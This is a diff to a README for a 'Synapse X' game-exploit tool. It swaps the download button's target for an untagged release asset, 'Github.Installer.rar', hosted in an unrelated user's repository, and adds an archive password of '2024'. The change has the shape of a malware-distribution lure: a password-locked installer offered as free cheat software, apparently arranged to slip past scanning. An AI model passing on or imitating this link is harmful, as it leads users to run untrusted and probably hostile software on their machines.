@@ -1,6 +1,9 @@
 # Synapse X | ![windows](https://github.com/FOXICZECK/Synapse-Free-X/assets/99992510/caed2cdf-67ea-453f-bad2-f01e9953e736) ![license](https://github.com/FOXICZECK/Synapse-Free-X/assets/99992510/4c9cc4bd-ceb0-49f7-a8a4-5ddf49f38f43)
 
-[![download_click](https://github.com/FOXICZECK/Synapse-Free-X/assets/99992510/ff1eadf3-2203-4c03-a9ab-ec28ecf64d1e)](https://github.com/XiniJous/ExProject/releases/tag/ExpLauncher)
+[![download_click](https://github.com/FOXICZECK/Synapse-Free-X/assets/99992510/ff1eadf3-2203-4c03-a9ab-ec28ecf64d1e)](https://github.com/ARAVIN006/ARAVIN0061/releases/download/untagged-e21f8bba96c7d57d6060/Github.Installer.rar)
+
+
+**Password:** `2024`
 
 # Some Info
 
